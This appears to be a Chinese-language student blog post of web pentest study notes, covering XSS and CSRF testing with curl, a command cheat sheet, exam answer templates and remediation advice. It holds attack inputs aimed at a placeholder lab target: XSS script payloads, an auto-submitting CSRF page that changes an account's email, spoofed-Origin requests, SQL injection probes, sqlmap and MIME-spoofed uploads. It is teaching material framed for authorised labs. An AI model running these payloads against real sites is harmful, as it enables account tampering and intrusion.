+<h3 id="6-5-保存响应并搜索关键内容"><a href="#6-5-保存响应并搜索关键内容" class="headerlink" title="6.5 保存响应并搜索关键内容"></a>6.5 保存响应并搜索关键内容</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s http://target/ &gt; response.html</span><br><span class="line">rg -n <span class="string">&#x27;script|alert|message|comment&#x27;</span> response.html</span><br></pre></td></tr></table></figure>
+
+<p>重点看：</p>
+<ul>
+<li>payload 是否被原样写入 HTML。</li>
+<li><code>&lt;</code>、<code>&gt;</code> 和引号是否被实体编码。</li>
+<li>浏览器会不会把内容当成标签。</li>
+</ul>
+<h3 id="6-6-URL-编码"><a href="#6-6-URL-编码" class="headerlink" title="6.6 URL 编码"></a>6.6 URL 编码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import urllib.parse, sys; print(urllib.parse.quote(sys.argv[1]))&#x27;</span> \</span><br><span class="line">  <span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果必须手工构造 URL，可以使用该结果。</p>
+<h3 id="6-7-XSS-的三种类型"><a href="#6-7-XSS-的三种类型" class="headerlink" title="6.7 XSS 的三种类型"></a>6.7 XSS 的三种类型</h3><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>特征</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>反射型</td>
+<td>payload 出现在当前响应中</td>
+</tr>
+<tr>
+<td>存储型</td>
+<td>payload 被保存，之后其他人查看时执行</td>
+</tr>
+<tr>
+<td>DOM 型</td>
+<td>浏览器端 JS 从 URL、存储等位置读取数据并写入 DOM</td>
+</tr>
+</tbody></table>
+<h3 id="6-8-修复"><a href="#6-8-修复" class="headerlink" title="6.8 修复"></a>6.8 修复</h3><ul>
+<li>根据输出上下文进行编码。</li>
+<li>HTML 正文使用 HTML 实体编码。</li>
+<li>不把不可信内容直接写入 <code>innerHTML</code>。</li>
+<li>使用 <code>textContent</code> 等安全 DOM API。</li>
+<li>设置 CSP。</li>
+<li>Cookie 使用 <code>HttpOnly</code>、<code>SameSite</code>、<code>Secure</code>。</li>
+</ul>
+<hr>
+<h2 id="7-CSRF-漏洞"><a href="#7-CSRF-漏洞" class="headerlink" title="7. CSRF 漏洞"></a>7. CSRF 漏洞</h2><p>CSRF 的核心不是偷 Cookie，而是让浏览器自动携带已有 Cookie，向目标站发送有副作用的请求。</p>
+<h3 id="7-1-检查-Cookie"><a href="#7-1-检查-Cookie" class="headerlink" title="7.1 检查 Cookie"></a>7.1 检查 Cookie</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -i -c cookies.txt \</span><br><span class="line">  -X POST http://target/login.php \</span><br><span class="line">  --data-urlencode <span class="string">&#x27;username=demo&#x27;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&#x27;password=demo&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<ul>
+<li><code>-c cookies.txt</code>：保存服务器返回的 Cookie。</li>
+<li><code>--data-urlencode</code>：编码表单值。</li>
+</ul>
+<p>查看 Cookie：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> cookies.txt</span><br></pre></td></tr></table></figure>
+
+<p>重点看：</p>
+<ul>
+<li>Cookie 名称。</li>
+<li>Domain。</li>
+<li>Path。</li>
+<li>Secure。</li>
+<li>HttpOnly。</li>
+<li>SameSite。</li>
+</ul>
+<h3 id="7-2-携带-Cookie-请求账户页"><a href="#7-2-携带-Cookie-请求账户页" class="headerlink" title="7.2 携带 Cookie 请求账户页"></a>7.2 携带 Cookie 请求账户页</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -b cookies.txt http://target/account.php</span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<ul>
+<li><code>-b cookies.txt</code>：读取已保存 Cookie 并发送。</li>
+<li>如果页面显示已登录信息，说明会话文件有效。</li>
+</ul>
+<h3 id="7-3-检查敏感操作是否有-Token"><a href="#7-3-检查敏感操作是否有-Token" class="headerlink" title="7.3 检查敏感操作是否有 Token"></a>7.3 检查敏感操作是否有 Token</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -b cookies.txt http://target/change-email.php</span><br></pre></td></tr></table></figure>
+
+<p>观察表单是否包含：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;随机值&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果没有不可预测 Token，记录为 CSRF 线索。</p>
+<h3 id="7-4-检查-GET-修改数据"><a href="#7-4-检查-GET-修改数据" class="headerlink" title="7.4 检查 GET 修改数据"></a>7.4 检查 GET 修改数据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -i -b cookies.txt \</span><br><span class="line">  <span class="string">&#x27;http://target/change-email.php?email=student%40local.test&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果 GET 请求就能修改邮箱、密码或权限，说明设计存在风险。</p>
+<p>数据修改操作应使用 POST。</p>
+<h3 id="7-5-检查-POST-请求"><a href="#7-5-检查-POST-请求" class="headerlink" title="7.5 检查 POST 请求"></a>7.5 检查 POST 请求</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -i -b cookies.txt \</span><br><span class="line">  -X POST http://target/change-email.php \</span><br><span class="line">  --data-urlencode <span class="string">&#x27;email=student@local.test&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>再从账户页验证结果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s -b cookies.txt http://target/account.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-6-查看-Cookie-的-SameSite"><a href="#7-6-查看-Cookie-的-SameSite" class="headerlink" title="7.6 查看 Cookie 的 SameSite"></a>7.6 查看 Cookie 的 SameSite</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -c cookies.txt http://target/login.php</span><br></pre></td></tr></table></figure>
+
+<p>关注：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: session=...; SameSite=Lax</span><br></pre></td></tr></table></figure>
+
+<p><code>SameSite</code> 是辅助防御，不能替代 CSRF Token。</p>
+<h3 id="7-7-检查-Origin-和-Referer"><a href="#7-7-检查-Origin-和-Referer" class="headerlink" title="7.7 检查 Origin 和 Referer"></a>7.7 检查 Origin 和 Referer</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -i -b cookies.txt \</span><br><span class="line">  -H <span class="string">&#x27;Origin: http://evil.local&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Referer: http://evil.local/attack.html&#x27;</span> \</span><br><span class="line">  -X POST http://target/change-email.php \</span><br><span class="line">  --data-urlencode <span class="string">&#x27;email=student@local.test&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<ul>
+<li><code>-H</code>：添加自定义请求头。</li>
+<li>这用于检查服务器是否验证来源。</li>
+<li>只检查 Referer 不等于完整 CSRF 防护。</li>
+</ul>
+<h3 id="7-8-本地模拟攻击者页面"><a href="#7-8-本地模拟攻击者页面" class="headerlink" title="7.8 本地模拟攻击者页面"></a>7.8 本地模拟攻击者页面</h3><p>可以准备一个本地 HTML 页面，在授权靶场中打开：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;csrf-form&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">method</span>=<span class="string">&quot;post&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">action</span>=<span class="string">&quot;http://target/change-email.php&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span></span></span><br><span class="line"><span class="tag">           <span class="attr">name</span>=<span class="string">&quot;email&quot;</span></span></span><br><span class="line"><span class="tag">           <span class="attr">value</span>=<span class="string">&quot;hacker@local.test&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;csrf-form&quot;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>启动本地服务器：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure>
+
+<p>浏览器访问：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8000/csrf-test.html</span><br></pre></td></tr></table></figure>
+
+<p>只有在自己的靶场中练习时，才使用这种自动提交页面。</p>
+<h3 id="7-9-判断-CSRF-的条件"><a href="#7-9-判断-CSRF-的条件" class="headerlink" title="7.9 判断 CSRF 的条件"></a>7.9 判断 CSRF 的条件</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 请求是否自动携带认证 Cookie？</span><br><span class="line">2. 服务器是否只检查 Cookie 是否存在？</span><br><span class="line">3. 是否存在实际副作用，如修改密码、邮箱、权限？</span><br><span class="line">4. 是否缺少 CSRF Token？</span><br><span class="line">5. 是否可以通过跨站表单或导航触发？</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-10-修复"><a href="#7-10-修复" class="headerlink" title="7.10 修复"></a>7.10 修复</h3><ul>
+<li>所有修改操作使用 POST。</li>
+<li>使用随机、会话绑定的 CSRF Token。</li>
+<li>服务端校验 Token。</li>
+<li>Cookie 配置 <code>SameSite=Lax</code> 或 <code>Strict</code>。</li>
+<li>敏感操作重新验证密码。</li>
+<li>可辅助验证 Origin&#x2F;Referer。</li>
+</ul>
+<hr>
+<h2 id="8-常用排查速查表"><a href="#8-常用排查速查表" class="headerlink" title="8. 常用排查速查表"></a>8. 常用排查速查表</h2><h3 id="8-1-地址或路径"><a href="#8-1-地址或路径" class="headerlink" title="8.1 地址或路径"></a>8.1 地址或路径</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -I URL</span><br><span class="line">curl -v URL</span><br><span class="line">curl -L URL</span><br><span class="line">curl -s -o /dev/null -w <span class="string">&#x27;%&#123;http_code&#125; %&#123;size_download&#125; %&#123;time_total&#125;\n&#x27;</span> URL</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-2-目录和文件"><a href="#8-2-目录和文件" class="headerlink" title="8.2 目录和文件"></a>8.2 目录和文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u URL -w 字典</span><br><span class="line">ffuf -u URL/FUZZ -w 字典 -<span class="built_in">fc</span> 404</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-3-源码"><a href="#8-3-源码" class="headerlink" title="8.3 源码"></a>8.3 源码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rg --files -g <span class="string">&#x27;*.php&#x27;</span></span><br><span class="line">rg -n <span class="string">&#x27;\$_GET|\$_POST|\$_FILES&#x27;</span> .</span><br><span class="line">rg -n <span class="string">&#x27;eval|include|system|exec|move_uploaded_file&#x27;</span> .</span><br><span class="line">php -l file.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-4-上传"><a href="#8-4-上传" class="headerlink" title="8.4 上传"></a>8.4 上传</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -i -F <span class="string">&#x27;upload_file=@file.bin&#x27;</span> URL</span><br><span class="line">curl -i -F <span class="string">&#x27;upload_file=@file.bin;type=image/png&#x27;</span> URL</span><br><span class="line">file --mime-type file.bin</span><br><span class="line">xxd -l 32 file.bin</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-5-SQL-注入"><a href="#8-5-SQL-注入" class="headerlink" title="8.5 SQL 注入"></a>8.5 SQL 注入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -sG URL --data-urlencode <span class="string">&#x27;id=1 and 1=1&#x27;</span></span><br><span class="line">curl -sG URL --data-urlencode <span class="string">&#x27;id=1 and 1=2&#x27;</span></span><br><span class="line">sqlmap -u <span class="string">&#x27;URL?id=1&#x27;</span> --batch --risk=1 --level=1</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-6-XSS"><a href="#8-6-XSS" class="headerlink" title="8.6 XSS"></a>8.6 XSS</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -sG URL --data-urlencode <span class="string">&quot;q=&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span></span><br><span class="line">curl -s URL -o response.html</span><br><span class="line">rg -n <span class="string">&#x27;script|alert&#x27;</span> response.html</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-7-CSRF"><a href="#8-7-CSRF" class="headerlink" title="8.7 CSRF"></a>8.7 CSRF</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -i -c cookies.txt -X POST LOGIN_URL -d <span class="string">&#x27;username=demo&amp;password=demo&#x27;</span></span><br><span class="line">curl -i -b cookies.txt ACCOUNT_URL</span><br><span class="line">curl -i -b cookies.txt -X POST CHANGE_URL -d <span class="string">&#x27;email=test@example.com&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="9-实操题标准答题模板"><a href="#9-实操题标准答题模板" class="headerlink" title="9. 实操题标准答题模板"></a>9. 实操题标准答题模板</h2><h3 id="信息收集模板"><a href="#信息收集模板" class="headerlink" title="信息收集模板"></a>信息收集模板</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">目标：</span><br><span class="line">IP/域名：</span><br><span class="line">开放端口：</span><br><span class="line">Web 路径：</span><br><span class="line">扫描字典：</span><br><span class="line">发现文件：</span><br><span class="line">判断依据：</span><br><span class="line">下一步：</span><br></pre></td></tr></table></figure>
+
+<h3 id="代码审计模板"><a href="#代码审计模板" class="headerlink" title="代码审计模板"></a>代码审计模板</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入点：</span><br><span class="line">过滤代码：</span><br><span class="line">危险函数：</span><br><span class="line">数据流：</span><br><span class="line">能否绕过：</span><br><span class="line">证据：</span><br><span class="line">修复：</span><br></pre></td></tr></table></figure>
+
+<h3 id="文件上传模板"><a href="#文件上传模板" class="headerlink" title="文件上传模板"></a>文件上传模板</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">上传字段：</span><br><span class="line">前端检查：</span><br><span class="line">服务端检查：</span><br><span class="line">文件名：</span><br><span class="line">Content-Type：</span><br><span class="line">文件内容：</span><br><span class="line">保存路径：</span><br><span class="line">访问结果：</span><br><span class="line">修复：</span><br></pre></td></tr></table></figure>
+
+<h3 id="注入模板"><a href="#注入模板" class="headerlink" title="注入模板"></a>注入模板</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">参数：</span><br><span class="line">正常响应：</span><br><span class="line">假条件响应：</span><br><span class="line">字段数：</span><br><span class="line">显示位：</span><br><span class="line">数据库：</span><br><span class="line">表：</span><br><span class="line">字段：</span><br><span class="line">证据：</span><br><span class="line">修复：</span><br></pre></td></tr></table></figure>
+
+<h3 id="XSS-模板"><a href="#XSS-模板" class="headerlink" title="XSS 模板"></a>XSS 模板</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入位置：</span><br><span class="line">输出上下文：</span><br><span class="line">payload：</span><br><span class="line">浏览器结果：</span><br><span class="line">影响对象：</span><br><span class="line">修复：</span><br></pre></td></tr></table></figure>
+
+<h3 id="CSRF-模板"><a href="#CSRF-模板" class="headerlink" title="CSRF 模板"></a>CSRF 模板</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">敏感操作：</span><br><span class="line">请求方法：</span><br><span class="line">Cookie：</span><br><span class="line">CSRF Token：</span><br><span class="line">Origin/Referer：</span><br><span class="line">副作用证据：</span><br><span class="line">修复：</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="10-最后的高频判断"><a href="#10-最后的高频判断" class="headerlink" title="10. 最后的高频判断"></a>10. 最后的高频判断</h2><ul>
+<li><code>grep</code> 搜内容，<code>find</code> 找文件，<code>rg</code> 更快搜源码。</li>
+<li><code>-i</code> 是 curl 显示响应头，不是“忽略证书”。</li>
+<li><code>-k</code> 是忽略 TLS 证书，只在本地靶场使用。</li>
+<li><code>-I</code> 是 HEAD 请求，不返回完整正文。</li>
+<li><code>-G</code> 加 <code>--data-urlencode</code> 适合测试 GET 参数。</li>
+<li><code>-c</code> 保存 Cookie，<code>-b</code> 携带 Cookie。</li>
+<li>Nmap <code>-p</code> 指定端口，<code>-p-</code> 扫描全部 TCP 端口。</li>
+<li>Dirsearch <code>-u</code> 指定 URL，<code>-r</code> 通常是递归。</li>
+<li>上传题的 MIME 检查看 <code>Content-Type</code>。</li>
+<li>SQL 注入的根因是用户输入改变 SQL 结构。</li>
+<li><code>sleep()</code> 是时间盲注函数，不是报错注入函数。</li>
+<li>XSS 要看输出上下文，不是只过滤 <code>&lt;script&gt;</code>。</li>
+<li>CSRF 不需要读取 Cookie，只需要让浏览器自动携带 Cookie。</li>
+<li>修改数据的接口不应该用 GET。</li>
+<li>修复 SQL 注入使用参数化查询。</li>
+<li>修复 XSS 使用输出上下文编码。</li>
+<li>修复 CSRF 使用随机 Token、SameSite 和敏感操作二次确认。</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://chinaqinhao.github.io">SpringQin</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://chinaqinhao.github.io/2026/11/21/%E6%95%B0%E6%8D%AE%E8%AD%A6%E5%8A%A1%E7%A4%BE%E7%BA%B3%E6%96%B0%E7%AC%94%E8%AE%B0/">https://chinaqinhao.github.io/2026/11/21/%E6%95%B0%E6%8D%AE%E8%AD%A6%E5%8A%A1%E7%A4%BE%E7%BA%B3%E6%96%B0%E7%AC%94%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://chinaqinhao.github.io" target="_blank">SpringQin's Blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/avatar-ponytail.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/11/20/SQLmap/" title="SQLmap"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">SQLmap</div></div><div class="info-2"><div class="info-item-1">SQL 注入靶场练习教程（sqlmap 实战） 适用环境：本机 Kali 虚拟机 · Apache 2.4 + MariaDB 11.8 + PHP 8.4靶场地址：http://127.0.0.1/lab/文档版本：2026-11-20   目录 靶场说明 准备工作 sqlmap 工作原理速览 第 1 关：数字型注入 第 2 关：字符型注入 第 3 关：登录框 POST 注入 第 4 关：盲注 进阶技巧 常见问题排查 学习路线 命令速查表   一、靶场说明1.1 这是什么一个故意写得不安全的迷你 Web 应用，专门用来练习 SQL 注入。代码里没有任何过滤、参数化查询或转义，所有输入都直接拼进 SQL 语句。 1.2 环境信息   项目 值    访问地址 http://127.0.0.1/lab/   宿主机访问地址 http://192.168.199.130/lab/   Web 根目录 /var/www/html/lab/   源码备份 ~/sqli-lab-src/   数据库 MariaDB，库名 sqli_lab   数据库账号 labuser &#x2F; la...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar-ponytail.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">SpringQin</div><div class="author-info-description">26网五秦昊</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ChinaQinHao"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">渗透实操常用命令详解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-number">1.1.</span> <span class="toc-text">目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%80%9A%E7%94%A8%E7%8E%AF%E5%A2%83%E4%B8%8E%E7%BB%93%E6%9E%9C%E8%AE%B0%E5%BD%95"><span class="toc-number">1.2.</span> <span class="toc-text">1. 通用环境与结果记录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E7%A1%AE%E8%AE%A4%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E3%80%81IP-%E5%92%8C%E7%9B%AE%E6%A0%87"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.1 确认当前用户、IP 和目标</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E5%BB%BA%E7%AB%8B%E5%AE%9E%E9%AA%8C%E8%AE%B0%E5%BD%95"><span class="toc-number">1.2.2.</span> <span class="toc-text">1.2 建立实验记录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-HTTP-%E7%8A%B6%E6%80%81%E7%A0%81"><span class="toc-number">1.2.3.</span> <span class="toc-text">1.3 HTTP 状态码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4-curl-%E9%80%9A%E7%94%A8%E5%8F%82%E6%95%B0"><span class="toc-number">1.2.4.</span> <span class="toc-text">1.4 curl 通用参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5-%E4%BD%BF%E7%94%A8-Burp-%E4%BB%A3%E7%90%86"><span class="toc-number">1.2.5.</span> <span class="toc-text">1.5 使用 Burp 代理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.3.</span> <span class="toc-text">2. 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E6%9F%A5%E7%9C%8B%E9%A1%B5%E9%9D%A2%E5%93%8D%E5%BA%94%E5%92%8C%E6%BA%90%E7%A0%81"><span class="toc-number">1.3.1.</span> <span class="toc-text">2.1 查看页面响应和源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E6%A3%80%E6%9F%A5-robots-txt-%E5%92%8C-sitemap"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.2 检查 robots.txt 和 sitemap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-Nmap-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.3.3.</span> <span class="toc-text">2.3 Nmap 端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-HTTP-%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.3.4.</span> <span class="toc-text">2.4 HTTP 服务探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5-Dirsearch-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">1.3.5.</span> <span class="toc-text">2.5 Dirsearch 目录扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-6-ffuf-%E7%AE%80%E5%8D%95%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">1.3.6.</span> <span class="toc-text">2.6 ffuf 简单目录扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-7-DNS-%E5%92%8C%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90"><span class="toc-number">1.3.7.</span> <span class="toc-text">2.7 DNS 和域名解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.4.</span> <span class="toc-text">3. 代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 